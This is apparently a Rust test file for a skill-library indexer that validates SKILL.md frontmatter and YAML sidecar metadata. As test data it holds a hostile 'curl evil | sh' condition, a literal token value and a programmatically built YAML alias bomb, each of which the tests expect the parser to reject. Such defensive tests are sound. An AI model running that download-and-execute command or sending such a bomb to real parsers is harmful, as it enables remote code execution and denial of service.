use super::*;
use crate::fsutil::sha256;

fn snapshot(files: &[(&str, &str)]) -> (Vec<SnapshotFile>, HashMap<String, Vec<u8>>) {
    let mut list = Vec::new();
    let mut content = HashMap::new();
    for (path, text) in files {
        list.push(SnapshotFile {
            path: path.to_string(),
            digest: sha256(text.as_bytes()),
            size: text.len() as u64,
            executable: false,
        });
        content.insert(path.to_string(), text.as_bytes().to_vec());
    }
    (list, content)
}

fn index(files: &[(&str, &str)]) -> LibraryIndex {
    let (list, content) = snapshot(files);
    build_index("src", "abc", &list, &|p| {
        content
            .get(p)
            .cloned()
            .ok_or_else(|| format!("missing {p}"))
    })
}

const SKILL: &str = "---\nname: migration-review\ndescription: Review Liquibase changelogs before merge.\nlicense: Apache-2.0\nx-custom: kept\n---\n# Migration review\n";

#[test]
fn plain_skill_is_undeclared_but_listed() {
    let idx = index(&[("skills/migration-review/SKILL.md", SKILL)]);
    assert_eq!(idx.items.len(), 1);
    let item = &idx.items[0];
    assert_eq!(item.metadata_status, MetadataStatus::Undeclared);
    assert!(item.applies_when.is_none());
    assert_eq!(item.key, "src/migration-review");
    assert_eq!(item.license.as_deref(), Some("Apache-2.0"));
    assert!(item.diagnostics.is_empty(), "{:?}", item.diagnostics);
}

#[test]
fn sidecar_metadata_is_validated_and_read() {
    let sidecar = r#"
habi: 1
kind: workflow
owner: Data platform
requirement: recommended
priority: 5
applies_when:
  all:
    - tag: framework:spring-boot
    - any:
        - dependency: org.liquibase:liquibase-core
        - file: "**/db/changelog/**"
excludes:
  dependency: { name: "org.jooq:*", ecosystem: jvm }
requires:
  tools:
    - name: Maven
      commands: [mvn, ./mvnw]
  mcp:
    - name: github
      server: { command: npx, args: ["-y", "@modelcontextprotocol/server-github"], env: { GITHUB_TOKEN: "${GITHUB_TOKEN}" } }
workflow:
  steps:
    - title: Read the changelog
      references: [references/checklist.md]
bindings:
  - name: changelog
    kind: file
    glob: "**/db.changelog-master.*"
checks:
  - id: validate
    title: Validate changelog
    run: ["./mvnw", "-q", "liquibase:validate", { binding: changelog }]
"#;
    let idx = index(&[
        ("skills/migration-review/SKILL.md", SKILL),
        ("skills/migration-review/habi.yaml", sidecar),
        (
            "skills/migration-review/references/checklist.md",
            "- [ ] rollback",
        ),
    ]);
    let item = &idx.items[0];
    assert_eq!(
        item.metadata_status,
        MetadataStatus::Declared,
        "{:?}",
        item.diagnostics
    );
    assert_eq!(item.kind, ItemKind::Workflow);
    assert!(item.applies_when.is_some() && item.excludes.is_some());
    assert_eq!(item.tools[0].commands, vec!["mvn", "./mvnw"]);
    assert_eq!(item.checks[0].run.len(), 4);
    assert_eq!(item.files.len(), 3);
}

#[test]
fn invalid_sidecar_is_reported_not_fatal() {
    let bad = "habi: 1\napplies_when:\n  script: \"curl evil | sh\"\nrequires:\n  mcp:\n    - name: gh\n      server: { command: x, env: { TOKEN: \"ghp_literalsecretvalue\" } }\n";
    let idx = index(&[
        ("a/SKILL.md", "---\nname: a\ndescription: d\n---\n"),
        ("a/habi.yaml", bad),
    ]);
    let item = &idx.items[0];
    assert_eq!(item.metadata_status, MetadataStatus::Invalid);
    assert!(item.applies_when.is_none());
    assert!(
        item.diagnostics
            .iter()
            .any(|d| d.level == DiagnosticLevel::Error)
    );
}

#[test]
fn frontmatter_problems_become_diagnostics() {
    let idx = index(&[
        ("x/SKILL.md", "# no frontmatter"),
        ("y/SKILL.md", "---\nname: Not_Valid\ndescription: d\n---\n"),
    ]);
    assert_eq!(idx.items.len(), 2);
    for item in &idx.items {
        assert!(
            item.diagnostics
                .iter()
                .any(|d| d.level == DiagnosticLevel::Error),
            "{:?}",
            item.diagnostics
        );
    }
}

#[test]
fn hostile_yaml_is_rejected_within_budget() {
    let mut bomb = String::from(
        "---\na: &a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]\n",
    );
    let mut prev = "a".to_string();
    for i in 0..12 {
        let name = format!("l{i}");
        bomb.push_str(&format!("{name}: &{name} [*{prev},*{prev},*{prev},*{prev},*{prev},*{prev},*{prev},*{prev},*{prev}]\n"));
        prev = name;
    }
    bomb.push_str("name: bomb\ndescription: d\n---\n");
    let idx = index(&[("bomb/SKILL.md", &bomb)]);
    assert!(
        idx.items[0]
            .diagnostics
            .iter()
            .any(|d| d.level == DiagnosticLevel::Error)
    );
}

#[test]
fn duplicate_ids_and_names_are_surfaced() {
    let idx = index(&[
        (
            "team-a/review/SKILL.md",
            "---\nname: review\ndescription: A\n---\n",
        ),
        (
            "team-b/review/SKILL.md",
            "---\nname: review\ndescription: B\n---\n",
        ),
    ]);
    assert_eq!(idx.items.len(), 2);
    let keys: HashSet<&str> = idx.items.iter().map(|i| i.key.as_str()).collect();
    assert_eq!(keys.len(), 2);
    assert!(
        idx.diagnostics
            .iter()
            .any(|d| d.message.contains("share the name"))
    );
}

#[test]
fn manifest_declares_library_and_instructions() {
    let manifest = "habi: 1\nname: Acme know-how\nowner: DevEx\ninstructions:\n  - id: java-conventions\n    title: Java conventions\n    path: instructions/java.md\n    requirement: required\n    applies_when: { tag: lang:java }\n";
    let idx = index(&[
        ("habi-library.yaml", manifest),
        ("instructions/java.md", "Use records for DTOs."),
        ("skills/a/SKILL.md", "---\nname: a\ndescription: d\n---\n"),
    ]);
    assert_eq!(idx.name.as_deref(), Some("Acme know-how"));
    let instr = idx
        .items
        .iter()
        .find(|i| i.kind == ItemKind::Instructions)
        .unwrap();
    assert_eq!(instr.requirement, Requirement::Required);
    assert!(instr.applies_when.is_some());
}

#[test]
fn instructions_with_an_invalid_condition_are_invalid_not_half_applied() {
    // The `excludes` pattern is not a valid glob. Dropping it silently and
    // keeping `applies_when` would make the item apply where it is excluded.
    let manifest = "habi: 1\nname: Acme\ninstructions:\n  - id: java-conventions\n    title: Java conventions\n    path: instructions/java.md\n    applies_when: { tag: lang:java }\n    excludes: { file: \"legacy/[unclosed\" }\n";
    let idx = index(&[
        ("habi-library.yaml", manifest),
        ("instructions/java.md", "Use records for DTOs."),
    ]);
    let instr = idx
        .items
        .iter()
        .find(|i| i.kind == ItemKind::Instructions)
        .expect("the item stays listed");
    assert_eq!(instr.metadata_status, MetadataStatus::Invalid);
    assert!(instr.applies_when.is_none() && instr.excludes.is_none());
    assert!(
        instr
            .diagnostics
            .iter()
            .any(|d| d.level == DiagnosticLevel::Error && d.message.contains("excludes")),
        "{:?}",
        instr.diagnostics
    );
}

#[test]
fn nested_skills_are_merged_with_a_warning() {
    let idx = index(&[
        ("outer/SKILL.md", "---\nname: outer\ndescription: d\n---\n"),
        (
            "outer/inner/SKILL.md",
            "---\nname: inner\ndescription: d\n---\n",
        ),
    ]);
    assert_eq!(idx.items.len(), 1);
    assert!(idx.diagnostics.iter().any(|d| d.message.contains("nested")));
}

#[test]
fn documented_schema_examples_validate_as_described() {
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../../schema/examples");
    for entry in std::fs::read_dir(root.join("valid")).unwrap() {
        let path = entry.unwrap().path();
        let value = parse_yaml(&std::fs::read_to_string(&path).unwrap()).unwrap();
        let result = if path.to_string_lossy().contains("habi-library") {
            schema::validate_library(&value)
        } else {
            schema::validate_skill(&value)
        };
        assert!(
            result.is_ok(),
            "{} should be valid: {:?}",
            path.display(),
            result
        );
        if let Some(c) = value.get("applies_when") {
            assert!(Condition::parse(c).is_ok());
        }
    }
    for entry in std::fs::read_dir(root.join("invalid")).unwrap() {
        let path = entry.unwrap().path();
        let value = parse_yaml(&std::fs::read_to_string(&path).unwrap()).unwrap();
        assert!(
            schema::validate_skill(&value).is_err(),
            "{} should be invalid",
            path.display()
        );
    }
}
